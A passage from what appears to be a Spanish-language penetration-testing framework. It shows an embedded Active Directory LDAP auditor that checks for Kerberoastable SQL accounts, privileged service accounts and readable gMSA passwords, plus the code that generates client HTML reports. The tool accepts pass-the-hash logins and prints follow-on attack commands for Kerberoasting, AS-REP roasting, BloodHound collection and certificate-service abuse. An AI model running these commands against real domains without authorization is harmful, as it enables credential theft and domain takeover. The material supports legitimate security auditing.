            sql_accounts = []
            for e in conn.entries:
                spns = list(e.servicePrincipalName.values) if hasattr(e.servicePrincipalName,'values') else [e.servicePrincipalName]
                is_admin = any('admin' in str(m).lower() for m in (e.memberOf.values if hasattr(e.memberOf,'values') else []))
                admin_flag = " 🚨 ADMIN GROUP!" if is_admin else ""
                sql_accounts.append(f"{e.sAMAccountName}: {str(spns[0])}{admin_flag}")
            finding("ALTO", "MSSQL Kerberoasting",
                f"SQL Server SPNs: {len(sql_accounts)} cuenta(s) — Alto valor para Kerberoasting",
                sql_accounts,
                "Usar MSA/gMSA para servicios SQL. Contraseñas de 25+ caracteres. SQL service accounts NO deben ser Domain Admin.",
                8.0, ["https://attack.mitre.org/techniques/T1558/003/"])
        else:
            print(f"  {D}[i]{W} Sin SQL Server SPNs detectados.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_34_privileged_service_accounts(conn, base_dn, ldap3):
    """CHECK 34: Cuentas de servicio con privilegios altos"""
    section("CHECK 34 — Service Accounts con Membresía Privilegiada")
    try:
        conn.search(base_dn,
            '(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))',
            attributes=['sAMAccountName','memberOf'])
        high_priv_svc = []
        priv_keywords = ['domain admin', 'enterprise admin', 'schema admin', 'administrator', 'backup operator']
        for e in conn.entries:
            groups = list(e.memberOf.values) if hasattr(e.memberOf,'values') else [str(e.memberOf or '')]
            is_priv = any(any(kw in str(g).lower() for kw in priv_keywords) for g in groups)
            if is_priv:
                grp_names = [re.search(r'CN=([^,]+)', str(g)).group(1) for g in groups[:2] if re.search(r'CN=([^,]+)', str(g))]
                high_priv_svc.append(f"{e.sAMAccountName} → grupos: {', '.join(grp_names)}")

        if high_priv_svc:
            finding("CRÍTICO", "Privileged Service Accounts",
                f"{len(high_priv_svc)} Cuenta(s) de Servicio con Privilegios de Admin",
                high_priv_svc,
                "Cuentas de servicio NO deben ser Domain Admin. Usar principio de mínimo privilegio. Migrar a gMSA.",
                9.0)
        else:
            print(f"  {G}[OK]{W} Sin service accounts con grupos privilegiados detectados.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_35_goldengmsa(conn, base_dn, ldap3):
    """CHECK 35: gMSA — Golden gMSA attack (msDS-ManagedPassword readable)"""
    section("CHECK 35 — gMSA Security (Golden gMSA)")
    try:
        conn.search(base_dn,
            '(objectClass=msDS-GroupManagedServiceAccount)',
            attributes=['sAMAccountName','msDS-ManagedPassword','msDS-ManagedPasswordID',
                        'msDS-GroupMSAMembership'])
        if conn.entries:
            gmsa_exposed = []
            for e in conn.entries:
                pwd = str(e['msDS-ManagedPassword'] or '')
                if pwd and pwd != '[]' and len(pwd) > 5:
                    gmsa_exposed.append(f"{e.sAMAccountName}: msDS-ManagedPassword LEGIBLE ← CRÍTICO!")
                else:
                    gmsa_exposed.append(f"{e.sAMAccountName}: gMSA presente (password protegido)")

            if any("LEGIBLE" in g for g in gmsa_exposed):
                finding("CRÍTICO", "Golden gMSA",
                    f"gMSA Password EXPUESTO para usuario actual",
                    [g for g in gmsa_exposed if "LEGIBLE" in g],
                    "Restringir msDS-ManagedPassword ACL. Solo los hosts autorizados (msDS-GroupMSAMembership) deben poder leer.",
                    9.5, ["https://improsec.com/tech-blog/o83i5pjygrqjn7ei3oknf7fek4dxdbn5"])
            else:
                print(f"  {G}[OK]{W} {len(conn.entries)} gMSA(s) encontradas — passwords no accesibles con este usuario.")
                finding("INFO", "gMSA Inventory",
                    f"{len(conn.entries)} Group Managed Service Account(s) detectada(s)",
                    [g for g in gmsa_exposed],
                    "Verificar con: Get-ADServiceAccount -Filter * -Properties msDS-GroupMSAMembership",
                    0.0)
        else:
            print(f"  {D}[i]{W} Sin gMSAs configuradas en este dominio.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

# ─────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ADPulse — AD Security Auditor')
    parser.add_argument('--dc',     required=True, help='IP/hostname del Domain Controller')
    parser.add_argument('--base',   required=True, help='Base DN (ej: DC=corp,DC=local)')
    parser.add_argument('--user',   default='',    help='Usuario (ej: CORP\\\\jsmith o jsmith@corp.local)')
    parser.add_argument('--pass',   default='',    dest='password', help='Contraseña')
    parser.add_argument('--hash',   default='',    help='Hash NTLM (Pass-the-Hash)')
    parser.add_argument('--output', default='',    help='Archivo JSON de salida')
    parser.add_argument('--checks', default='all', help='Checks a ejecutar (all o 01,03,05)')
    args = parser.parse_args()

    print(f"\n  {'═'*60}")
    print(f"  {B}{BOLD}ADPulse — Active Directory Security Auditor{W}")
    print(f"  {D}35 checks | LDAP read-only | Integrado en WriestTavo v8.0{W}")
    print(f"  {'═'*60}")
    print(f"  DC     : {Y}{args.dc}{W}")
    print(f"  Base DN: {Y}{args.base}{W}")
    print(f"  Usuario: {G}{args.user or 'Anónimo'}{W}")
    print(f"  Modo   : {C}{'Pass-the-Hash' if args.hash else 'Contraseña' if args.password else 'Anonymous/Null'}{W}")
    print()

    # Conectar
    conn, ldap3 = connect_ldap(args.dc, args.base, args.user or None,
                                args.password or None, args.hash or None)
    if not conn:
        print(f"  {R}[ERROR]{W} No se pudo conectar al DC {args.dc}:389")
        print(f"  Verificar: conectividad, credenciales y que LDAP esté habilitado.")
        sys.exit(1)

    auth_type = "Anónimo" if not args.user else ("PtH" if args.hash else "Autenticado")
    print(f"  {G}[+]{W} Conectado como {B}{auth_type}{W} a {args.dc}\n")

    # Ejecutar los 35 checks
    checks = [
        check_01_null_session,         # 01
        check_02_password_policy,      # 02
        check_03_kerberoastable,        # 03
        check_04_asrep_roasting,        # 04
        check_05_adcs_vulnerabilities,  # 05
        check_06_unconstrained_delegation, # 06
        check_07_constrained_delegation,   # 07
        check_08_rbcd,                     # 08
        check_09_laps,                     # 09
        check_10_domain_admins,            # 10
        check_11_inactive_accounts,        # 11
        check_12_password_not_required,    # 12
        check_13_password_never_expires,   # 13
        check_14_admin_count,              # 14
        check_15_dcsync_rights,            # 15
        check_16_machine_account_quota,    # 16
        check_17_guest_account,            # 17
        check_18_gpo_analysis,             # 18
        check_19_trusts,                   # 19
        check_20_recycle_bin,              # 20
        check_21_spooler_service,          # 21
        check_22_krbtgt_password_age,      # 22
        check_23_protected_users,          # 23
        check_24_dns_admins,               # 24
        check_25_backup_operators,         # 25
        check_26_exchange_permissions,     # 26
        check_27_ldap_signing,             # 27
        check_28_rodc_krbtgt,              # 28
        check_29_shadow_credentials,       # 29
        check_30_gpo_scripts,              # 30
        check_31_fine_grained_policy,      # 31
        check_32_ous_delegation,           # 32
        check_33_mssql_spns,               # 33
        check_34_privileged_service_accounts, # 34
        check_35_goldengmsa,               # 35
    ]

    selected = list(range(len(checks)))
    if args.checks != 'all':
        selected = [int(c)-1 for c in args.checks.split(',') if c.strip().isdigit()]

    for idx in selected:
        if 0 <= idx < len(checks):
            try:
                checks[idx](conn, args.base, ldap3)
            except Exception as ex:
                print(f"  {Y}[!]{W} Check {idx+1:02d} error: {ex}")

    # ── Resumen final ─────────────────────────────────────────
    print(f"\n  {'═'*60}")
    print(f"  {BOLD}RESUMEN ADPulse{W}")
    print(f"  {'═'*60}")
    total = sum(stats.values())
    print(f"  {R}{BOLD}💀 CRÍTICO: {stats['CRÍTICO']}{W}   {R}🔴 ALTO: {stats['ALTO']}{W}   {Y}🟡 MEDIO: {stats['MEDIO']}{W}   {G}🟢 BAJO: {stats['BAJO']}{W}   {B}ℹ️  INFO: {stats['INFO']}{W}")
    print(f"  Total hallazgos: {total} en {len(selected)} checks ejecutados")

    if args.output:
        with open(args.output, 'w') as f:
            json.dump({"domain": args.base, "dc": args.dc, "user": args.user,
                       "timestamp": datetime.now(timezone.utc).isoformat(),
                       "stats": dict(stats), "findings": findings}, f, indent=2, default=str)
        print(f"\n  Resultados guardados: {args.output}")

    print()
    conn.unbind()
PYAD

    # ── Ejecutar ADPulse ──────────────────────────────────────────
    ok "ADPulse Python script creado en: ${adpulse_py}"
    echo

    # Construir argumentos
    local py_args="--dc ${INTEL_AD_DC} --base \"${ldap_base}\" --output ${adpulse_json}"
    [[ -n "$ad_user" ]]  && py_args+=" --user \"${ad_user}\""
    [[ -n "$ad_pass" ]]  && py_args+=" --pass \"${ad_pass}\""
    [[ -n "$ad_hash" ]]  && py_args+=" --hash \"${ad_hash}\""

    cmd_show "python3 ${adpulse_py} ${py_args}"
    eval "python3 '${adpulse_py}' ${py_args}" 2>/dev/null | tee "${OUTPUT_DIR}/recon/adpulse_output.txt"

    # ── Parsear JSON y agregar hallazgos al reporte HTML ─────────
    if [[ -f "$adpulse_json" ]]; then
        ok "ADPulse: resultados guardados en ${adpulse_json}"

        # Leer resultados y crear hallazgo HTML compuesto
        python3 - << PYADREPORT
import json, sys

try:
    with open("${adpulse_json}") as f:
        data = json.load(f)

    findings = data.get("findings", [])
    stats    = data.get("stats", {})

    # Construir HTML para el reporte de WriestTavo
    html = f"""
<div style='background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:16px;margin-bottom:12px;'>
  <div style='display:flex;gap:16px;flex-wrap:wrap;margin-bottom:12px;'>
    <span style='background:#ff2d2d22;border:1px solid #ff2d2d;padding:4px 12px;border-radius:4px;color:#ff2d2d;font-weight:bold;'>💀 Crítico: {stats.get('CRÍTICO',0)}</span>
    <span style='background:#ff6b3522;border:1px solid #ff6b35;padding:4px 12px;border-radius:4px;color:#ff6b35;font-weight:bold;'>🔴 Alto: {stats.get('ALTO',0)}</span>
    <span style='background:#ffd23f22;border:1px solid #ffd23f;padding:4px 12px;border-radius:4px;color:#ffd23f;font-weight:bold;'>🟡 Medio: {stats.get('MEDIO',0)}</span>
    <span style='background:#57cc9922;border:1px solid #57cc99;padding:4px 12px;border-radius:4px;color:#57cc99;'>🟢 Bajo: {stats.get('BAJO',0)}</span>
    <span style='background:#58a6ff22;border:1px solid #58a6ff;padding:4px 12px;border-radius:4px;color:#58a6ff;'>ℹ️ Info: {stats.get('INFO',0)}</span>
  </div>
  <small style='color:#8b949e;'>DC: {data.get('dc','')} | Dominio: {data.get('domain','')} | Usuario: {data.get('user','Anónimo')} | {data.get('timestamp','')[:19].replace('T',' ')}</small>
</div>"""

    sev_colors = {"CRÍTICO":"#ff2d2d","ALTO":"#ff6b35","MEDIO":"#ffd23f","BAJO":"#57cc99","INFO":"#58a6ff"}
    sev_bg     = {"CRÍTICO":"#1a0a0a","ALTO":"#1a0f0a","MEDIO":"#1a180a","BAJO":"#0a1a0a","INFO":"#0a0f1a"}

    for f in findings:
        sev   = f.get("severity","INFO")
        color = sev_colors.get(sev,"#8b949e")
        bg    = sev_bg.get(sev,"#161b22")
        cvss  = f.get("cvss",0)
        refs  = f.get("refs",[])

        detail_html = "".join(f"<li style='margin:3px 0;'>{d}</li>" for d in f.get("detail",[])[:8])
        refs_html   = " ".join(f"<a href='{r}' target='_blank' style='font-size:11px;color:#58a6ff;margin-right:8px;'>{r[:60]}...</a>" for r in refs[:2])

        html += f"""
<div style='background:{bg};border-left:4px solid {color};padding:12px;margin-bottom:8px;border-radius:0 6px 6px 0;'>
  <div style='display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;'>
    <span style='color:{color};font-weight:bold;font-size:13px;'>[{sev}] {f.get('title','')}</span>
    {'<span style=\'background:#ff2d2d;color:#fff;padding:2px 8px;border-radius:4px;font-size:12px;font-weight:bold;\'>CVSS '+str(cvss)+'</span>' if cvss >= 7 else ''}
    <span style='color:#484f58;font-size:11px;'>{f.get('category','')}</span>
  </div>
  <ul style='margin:0 0 8px 16px;color:#c9d1d9;font-size:12px;'>{detail_html}</ul>
  <div style='background:#0d1117;padding:8px;border-radius:4px;font-size:11px;'>
    <span style='color:#3fb950;'>🔧 Remediar:</span> <span style='color:#8b949e;'>{f.get('remediation','')[:200]}</span>
  </div>
  {'<div style="margin-top:6px;">' + refs_html + '</div>' if refs_html else ''}
</div>"""

    print("ADPULSE_HTML_START")
    print(html)
    print("ADPULSE_HTML_END")
    total = sum(stats.values())
    crit  = stats.get('CRÍTICO',0)
    alto  = stats.get('ALTO',0)
    print(f"ADPULSE_STATS:{total}:{crit}:{alto}")
except Exception as e:
    print(f"Error parsing ADPulse results: {e}", file=sys.stderr)
PYADREPORT
    fi

    # ── Parsear output y agregar hallazgo principal al reporte ───
    local ad_html ad_total ad_crit ad_alto
    if [[ -f "$adpulse_json" ]]; then
        ad_html=$(python3 "${adpulse_py%adpulse_audit.py}adpulse_html_tmp.py" 2>/dev/null || \
                  sed -n '/ADPULSE_HTML_START/,/ADPULSE_HTML_END/p' "${OUTPUT_DIR}/recon/adpulse_output.txt" | \
                  grep -v "ADPULSE_HTML_")
        local stats_line
        stats_line=$(grep "ADPULSE_STATS:" "${OUTPUT_DIR}/recon/adpulse_output.txt" 2>/dev/null | tail -1)
        ad_total=$(echo "$stats_line" | cut -d: -f2)
        ad_crit=$(echo "$stats_line"  | cut -d: -f3)
        ad_alto=$(echo "$stats_line"  | cut -d: -f4)

        local ad_sev="INFO"
        [[ "${ad_crit:-0}" -gt 0 ]] && ad_sev="CRÍTICO"
        [[ "${ad_crit:-0}" -eq 0 && "${ad_alto:-0}" -gt 0 ]] && ad_sev="ALTO"

        add_finding "$ad_sev" \
            "ADPulse — Active Directory: ${ad_total:-0} hallazgos (${ad_crit:-0} críticos, ${ad_alto:-0} altos)" \
            "${ad_html:-<p>Ver ${OUTPUT_DIR}/recon/adpulse_output.txt para detalles completos.</p>}" \
            "$(python3 -c "import json; d=json.load(open('${adpulse_json}')); cvss=[f['cvss'] for f in d.get('findings',[]) if f.get('cvss',0)>0]; print(round(max(cvss),1) if cvss else 0)" 2>/dev/null || echo "8.5")" \
            "Ver remedaciones por check en el reporte. Priorizar: ADCS ESC1 > Kerberoasting > DCSync > Unconstrained Delegation." \
            "BloodHound para análisis visual | Certify.exe /vulnerable para ADCS | Rubeus kerberoast para validar | Impacket GetUserSPNs.py"

        intel_log "ADPulse: ${ad_total:-0} hallazgos AD en ${INTEL_AD_DOMAIN}"
        INTEL_AD_KERBEROASTABLE+=("Ver ${OUTPUT_DIR}/recon/adpulse_output.txt")
    fi

    # ── Sugerir siguiente paso con credenciales ───────────────────
    echo
    echo -e "  ${C_BLU}── Siguiente paso recomendado según hallazgos: ──${C_RST}"
    echo -e "  ${C_YEL}Kerberoasting:${C_RST}   impacket-GetUserSPNs '${INTEL_AD_DOMAIN}/${ad_user}:PASS' -dc-ip ${INTEL_AD_DC} -request"
    echo -e "  ${C_YEL}AS-REP Roast:${C_RST}    impacket-GetNPUsers '${INTEL_AD_DOMAIN}/' -usersfile users.txt -dc-ip ${INTEL_AD_DC} -no-pass"
    echo -e "  ${C_YEL}Bloodhound:${C_RST}      bloodhound-python -d '${INTEL_AD_DOMAIN}' -u '${ad_user}' -p 'PASS' -dc ${INTEL_AD_DC} -c all"
    echo -e "  ${C_YEL}ADCS:${C_RST}            certipy find -u '${ad_user}@${INTEL_AD_DOMAIN}' -p 'PASS' -dc-ip ${INTEL_AD_DC} -vulnerable"
    echo -e "  ${C_YEL}LDAP dump:${C_RST}       ldapdomaindump -u '${INTEL_AD_DOMAIN}\\\\${ad_user}' -p 'PASS' ldap://${INTEL_AD_DC}"
    echo
}



# ════════════════════════════════════════════════════════════════
# SISTEMA DE 3 REPORTES ESPECIALIZADOS
# Reporte 1: Cliente IT   — Ejecutivo + Payloads aplicables
# Reporte 2: Censurado    — Privacidad / Legal / Compliance
# Reporte 3: Pentester    — Técnico completo + rutas de ataque
# ════════════════════════════════════════════════════════════════

# Variables de tracking de evidencia
EFFECTIVE_PAYLOADS=()   # "tipo|payload|url|evidencia"
ATTACK_ROUTES=()        # "ruta de ataque encadenada"
REPORT_CLIENT=""        # path reporte cliente
REPORT_CENSORED=""      # path reporte censurado
REPORT_PENTESTER=""     # path reporte pentester

# ── Registrar payload efectivo (llamar desde módulos) ───────────
register_payload() {
    # register_payload TIPO PAYLOAD URL EVIDENCIA
    EFFECTIVE_PAYLOADS+=("${1}|||${2}|||${3}|||${4}")
}

# ── Registrar ruta de ataque ─────────────────────────────────────
register_attack_route() {
    ATTACK_ROUTES+=("$1")
}

# ════════════════════════════════════════════════════════════════
# REPORTE 1: CLIENTE IT
# ════════════════════════════════════════════════════════════════
generar_reporte_cliente() {
    log "Generando Reporte 1: Cliente IT..."
    local ts
    ts=$(date +"%Y%m%d_%H%M%S")
    REPORT_CLIENT="${OUTPUT_DIR}/reporte_CLIENTE_${TARGET//[^a-zA-Z0-9]/_}_${ts}.html"

    # Conteos
    local crit=0 alto=0 med=0 bajo=0 info_c=0
    local total_cvss=0 cvss_n=0
    for f in "${FINDINGS[@]}"; do
        local sev; sev=$(echo "$f" | awk -F'|||' '{print $1}')
        case "$sev" in
            CRÍTICO) ((crit++)) ;;
            ALTO)    ((alto++)) ;;
            MEDIO)   ((med++)) ;;
            BAJO)    ((bajo++)) ;;
            *)       ((info_c++)) ;;
        esac
        local cv; cv=$(echo "$f" | awk -F'|||' '{print $4}' | grep -oE '^[0-9]+\.?[0-9]*' | head -1)
        [[ -n "$cv" ]] && total_cvss=$(python3 -c "print(${total_cvss}+${cv})" 2>/dev/null || echo "$total_cvss") && ((cvss_n++))
    done
    local avg_cvss="N/A"
    (( cvss_n > 0 )) && avg_cvss=$(python3 -c "print(round(${total_cvss}/${cvss_n},1))" 2>/dev/null || echo "N/A")

    # Nivel de riesgo global
    local risk_level="BAJO" risk_color="#57cc99" risk_icon="🟢"
    (( crit > 0 )) && risk_level="CRÍTICO" && risk_color="#ff2d2d" && risk_icon="🔴"
    (( crit == 0 && alto > 0 )) && risk_level="ALTO" && risk_color="#ff6b35" && risk_icon="🟠"
    (( crit == 0 && alto == 0 && med > 0 )) && risk_level="MEDIO" && risk_color="#ffd23f" && risk_icon="🟡"

    # Payloads confirmados por categoría
    local payload_sqli="" payload_xss="" payload_lfi="" payload_ssrf=""
    for ep in "${EFFECTIVE_PAYLOADS[@]}"; do
        local ep_tipo ep_payload ep_url ep_ev
        ep_tipo=$(echo "$ep"    | awk -F'|||' '{print $1}')
        ep_payload=$(echo "$ep" | awk -F'|||' '{print $2}')
        ep_url=$(echo "$ep"     | awk -F'|||' '{print $3}')
        ep_ev=$(echo "$ep"      | awk -F'|||' '{print $4}')
        case "${ep_tipo,,}" in
            sqli|sql*)
                payload_sqli+="<tr><td><code class='payload-tag'>${ep_payload}</code></td>"
                payload_sqli+="<td class='url-col'>${ep_url}</td>"
                payload_sqli+="<td>${ep_ev}</td></tr>"
                ;;
            xss*)
                payload_xss+="<tr><td><code class='payload-tag xss'>${ep_payload}</code></td>"
                payload_xss+="<td class='url-col'>${ep_url}</td>"
                payload_xss+="<td>${ep_ev}</td></tr>"
                ;;
            lfi*)
                payload_lfi+="<tr><td><code class='payload-tag lfi'>${ep_payload}</code></td>"
                payload_lfi+="<td class='url-col'>${ep_url}</td>"
                payload_lfi+="<td>${ep_ev}</td></tr>"
                ;;
            ssrf*)
                payload_ssrf+="<tr><td><code class='payload-tag ssrf'>${ep_payload}</code></td>"
                payload_ssrf+="<td class='url-col'>${ep_url}</td>"
                payload_ssrf+="<td>${ep_ev}</td></tr>"
                ;;
        esac
    done

    # Construir sección de hallazgos para cliente (sin comandos técnicos de explotación)
    local findings_html=""
    for finding in "${FINDINGS[@]}"; do
        local sev title detail cvss rem
        sev=$(echo    "$finding" | awk -F'|||' '{print $1}')
        title=$(echo  "$finding" | awk -F'|||' '{print $2}')
        detail=$(echo "$finding" | awk -F'|||' '{print $3}')
        cvss=$(echo   "$finding" | awk -F'|||' '{print $4}')
        rem=$(echo    "$finding" | awk -F'|||' '{print $5}')

        [[ "$sev" == "INFO" ]] && continue   # cliente no ve INFO

        local color="#5bc0de"
        case "$sev" in
            CRÍTICO) color="#ff2d2d" ;;
            ALTO)    color="#ff6b35" ;;
            MEDIO)   color="#ffd23f" ;;
            BAJO)    color="#57cc99" ;;
        esac

        # Traducir severidad a impacto de negocio
        local biz_impact=""
        case "$sev" in
            CRÍTICO) biz_impact="Acceso no autorizado o robo de datos críticos es posible <b>hoy mismo</b>. Requiere acción <u>inmediata</u>." ;;
            ALTO)    biz_impact="Riesgo significativo de compromiso. Corregir en el <b>próximo sprint</b>." ;;
            MEDIO)   biz_impact="Vulnerabilidad que podría ser explotada en combinación con otras. Corregir en <b>30 días</b>." ;;
            BAJO)    biz_impact="Exposición de información o configuración subóptima. Incluir en <b>backlog</b>." ;;
        esac

        # Indicar si hubo payload confirmado para este hallazgo
        local payload_badge=""
        if echo "${title,,}" | grep -qE "sql injection|sqli"; then
            [[ -n "$payload_sqli" ]] && payload_badge="<span class='payload-confirmed'>✓ INYECCIÓN CONFIRMADA</span>"
        elif echo "${title,,}" | grep -qE "xss|cross.site"; then
            [[ -n "$payload_xss" ]] && payload_badge="<span class='payload-confirmed'>✓ PAYLOAD XSS ACTIVO</span>"
        elif echo "${title,,}" | grep -qE "lfi|path traversal|local file"; then
            [[ -n "$payload_lfi" ]] && payload_badge="<span class='payload-confirmed'>✓ ACCESO A ARCHIVOS CONFIRMADO</span>"
        elif echo "${title,,}" | grep -qE "ssrf|server.side request"; then
            [[ -n "$payload_ssrf" ]] && payload_badge="<span class='payload-confirmed'>✓ ACCESO INTERNO CONFIRMADO</span>"
        fi

        findings_html+="<div class='finding-card' style='border-left:4px solid ${color};'>"
        findings_html+="<div class='card-header'>"
        findings_html+="<span class='sev-badge' style='background:${color};'>${sev}</span>"
        [[ -n "$cvss" && "$cvss" != "N/A" ]] && findings_html+="<span class='cvss-pill'>CVSS ${cvss}</span>"
        findings_html+="<span class='card-title'>${title}</span>"
        findings_html+="${payload_badge}"
        findings_html+="</div>"
        findings_html+="<div class='card-body'>"
        # Strip comandos técnicos del detail para cliente
        local clean_detail
        clean_detail=$(echo "$detail" | sed 's|<div class=['\''"]nextstep.*</div>||g' \
            | sed 's|<code>[^<]*</code>||g' \
            | sed 's|<pre>[^<]*</pre>||g' 2>/dev/null || echo "$detail")
        findings_html+="<div class='biz-impact'><b>💼 Impacto de negocio:</b> ${biz_impact}</div>"
        findings_html+="<div class='tech-summary'>${clean_detail:0:400}</div>"
        findings_html+="<div class='remediation-block'><b>✅ Cómo solucionarlo:</b><br>${rem}</div>"
        findings_html+="</div></div>"
    done

    # Construir tabla de payloads confirmados
    local payloads_section=""
    if (( ${#EFFECTIVE_PAYLOADS[@]} > 0 )); then
        payloads_section="<section class='payloads-section'>"
        payloads_section+="<h2>⚠ Inyecciones y Técnicas Confirmadas</h2>"
        payloads_section+="<p class='section-desc'>Las siguientes técnicas de ataque fueron <b>verificadas exitosamente</b> durante la auditoría. Representan rutas de acceso reales que un atacante podría utilizar.</p>"

        [[ -n "$payload_sqli" ]] && payloads_section+="
        <h3>💉 SQL Injection Confirmado</h3>
        <table class='payload-table'>
        <thead><tr><th>Payload Aplicable</th><th>URL Afectada</th><th>Evidencia</th></tr></thead>
        <tbody>${payload_sqli}</tbody></table>"

        [[ -n "$payload_xss" ]] && payloads_section+="
        <h3>🔗 Cross-Site Scripting (XSS) Confirmado</h3>
        <table class='payload-table'>
        <thead><tr><th>Payload Aplicable</th><th>URL Afectada</th><th>Evidencia</th></tr></thead>
        <tbody>${payload_xss}</tbody></table>"

        [[ -n "$payload_lfi" ]] && payloads_section+="
        <h3>📂 Lectura de Archivos (LFI) Confirmada</h3>
        <table class='payload-table'>
        <thead><tr><th>Payload Aplicable</th><th>URL Afectada</th><th>Evidencia</th></tr></thead>
        <tbody>${payload_lfi}</tbody></table>"

        [[ -n "$payload_ssrf" ]] && payloads_section+="
        <h3>🌐 SSRF / Acceso Interno Confirmado</h3>
        <table class='payload-table'>
        <thead><tr><th>Payload Aplicable</th><th>URL Afectada</th><th>Evidencia</th></tr></thead>
        <tbody>${payload_ssrf}</tbody></table>"

        payloads_section+="</section>"
    fi

    cat > "$REPORT_CLIENT" << CLIENTHTML
<!DOCTYPE html><html lang="es"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Informe de Seguridad — ${TARGET} — Cliente IT</title>
<style>
  :root{--bg:#f8f9fa;--bg2:#ffffff;--txt:#2c3e50;--txt2:#5a6877;--border:#e0e6ed;
        --accent:#2563eb;--red:#dc2626;--orange:#ea580c;--yellow:#d97706;--green:#16a34a;}
  *{box-sizing:border-box;margin:0;padding:0;}
  body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--txt);line-height:1.6;}
  .header{background:linear-gradient(135deg,#1e3a8a 0%,#2563eb 50%,#0ea5e9 100%);
          color:#fff;padding:40px 48px;position:relative;overflow:hidden;}
  .header::before{content:'';position:absolute;top:-40px;right:-40px;width:200px;height:200px;
                  background:rgba(255,255,255,.05);border-radius:50%;}
  .header-logo{font-size:11px;letter-spacing:3px;text-transform:uppercase;
               opacity:.7;margin-bottom:8px;}
  .header h1{font-size:28px;font-weight:700;margin-bottom:6px;}
  .header-meta{display:flex;gap:24px;margin-top:16px;font-size:13px;opacity:.85;}
  .header-meta span{display:flex;align-items:center;gap:6px;}
  .container{max-width:1100px;margin:0 auto;padding:32px 24px;}
  /* Risk Banner */
  .risk-banner{background:var(--bg2);border:2px solid ${risk_color};border-radius:12px;
               padding:24px 32px;margin-bottom:32px;display:flex;align-items:center;gap:24px;}
  .risk-icon{font-size:48px;}
  .risk-title{font-size:22px;font-weight:700;color:${risk_color};}
  .risk-desc{color:var(--txt2);font-size:15px;margin-top:4px;}
  /* Stats */
  .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
              gap:16px;margin-bottom:32px;}
  .stat-card{background:var(--bg2);border-radius:10px;padding:20px;text-align:center;
             box-shadow:0 1px 4px rgba(0,0,0,.06);border:1px solid var(--border);}
  .stat-num{font-size:36px;font-weight:800;line-height:1;}
  .stat-label{font-size:12px;color:var(--txt2);text-transform:uppercase;
              letter-spacing:1px;margin-top:6px;}
  .stat-crit .stat-num{color:var(--red);}
  .stat-high .stat-num{color:var(--orange);}
  .stat-med  .stat-num{color:var(--yellow);}
  .stat-low  .stat-num{color:var(--green);}
  .stat-cvss .stat-num{color:var(--accent);}
  /* Section */
  section{background:var(--bg2);border-radius:12px;padding:28px;
          margin-bottom:24px;box-shadow:0 1px 4px rgba(0,0,0,.06);border:1px solid var(--border);}
  section h2{font-size:18px;font-weight:700;margin-bottom:8px;
             display:flex;align-items:center;gap:8px;}
  .section-desc{color:var(--txt2);font-size:14px;margin-bottom:20px;}
  /* Timeline prioridad */
  .timeline{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px;margin-top:16px;}
  .timeline-col{border-radius:8px;padding:16px;}
  .timeline-col.t1{background:#fff1f2;border:1px solid #fecaca;}
  .timeline-col.t2{background:#fff7ed;border:1px solid #fed7aa;}
  .timeline-col.t3{background:#f0fdf4;border:1px solid #bbf7d0;}
  .timeline-col h4{font-size:13px;font-weight:700;margin-bottom:10px;text-transform:uppercase;}
  .timeline-col.t1 h4{color:var(--red);}
  .timeline-col.t2 h4{color:var(--orange);}
  .timeline-col.t3 h4{color:var(--green);}
  .timeline-col li{font-size:13px;color:var(--txt2);margin-bottom:4px;padding-left:14px;position:relative;}
  .timeline-col li::before{content:'•';position:absolute;left:0;}
  /* Finding Cards */
  .finding-card{background:#fafbfc;border-radius:8px;margin-bottom:16px;
                overflow:hidden;border:1px solid var(--border);}
  .card-header{padding:14px 18px;display:flex;align-items:center;gap:10px;
               flex-wrap:wrap;background:#fff;}
  .sev-badge{font-size:11px;font-weight:700;color:#fff;padding:3px 10px;
             border-radius:4px;text-transform:uppercase;letter-spacing:.5px;}
  .cvss-pill{font-size:11px;font-weight:600;padding:3px 8px;border-radius:4px;
             background:#f1f5f9;color:var(--txt2);border:1px solid var(--border);}
  .card-title{font-size:15px;font-weight:600;flex:1;}
  .payload-confirmed{font-size:11px;font-weight:700;color:#fff;background:#7c3aed;
                     padding:3px 10px;border-radius:4px;margin-left:auto;}
  .card-body{padding:16px 18px;}
  .biz-impact{background:#eff6ff;border-left:3px solid var(--accent);padding:10px 14px;
              border-radius:0 6px 6px 0;font-size:14px;margin-bottom:12px;}
  .tech-summary{font-size:13px;color:var(--txt2);margin-bottom:12px;}
  .remediation-block{background:#f0fdf4;border-left:3px solid var(--green);
                     padding:10px 14px;border-radius:0 6px 6px 0;font-size:13px;}
  /* Payloads */
  .payloads-section h3{font-size:15px;font-weight:600;margin:18px 0 10px;
                       color:var(--txt);}
  .payload-table{width:100%;border-collapse:collapse;font-size:13px;margin-bottom:8px;}
  .payload-table th{background:#f1f5f9;padding:8px 12px;text-align:left;
                    font-weight:600;border-bottom:2px solid var(--border);}
  .payload-table td{padding:8px 12px;border-bottom:1px solid var(--border);vertical-align:top;}
  .payload-table tr:last-child td{border-bottom:none;}
  .payload-tag{background:#fef3c7;color:#92400e;padding:2px 8px;
               border-radius:4px;font-family:monospace;font-size:12px;word-break:break-all;}
  .payload-tag.xss{background:#fce7f3;color:#9d174d;}
  .payload-tag.lfi{background:#ede9fe;color:#5b21b6;}
  .payload-tag.ssrf{background:#ecfdf5;color:#065f46;}
  .url-col{font-family:monospace;font-size:11px;color:var(--txt2);word-break:break-all;max-width:250px;}
  /* Intel */
  .intel-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;margin-top:12px;}
  .intel-chip{background:#f1f5f9;border-radius:6px;padding:8px 12px;font-size:13px;}
  .intel-chip b{display:block;font-size:11px;color:var(--txt2);text-transform:uppercase;
                letter-spacing:.5px;margin-bottom:2px;}
  /* Footer */
  .footer{background:var(--txt);color:#fff;padding:24px 48px;margin-top:40px;
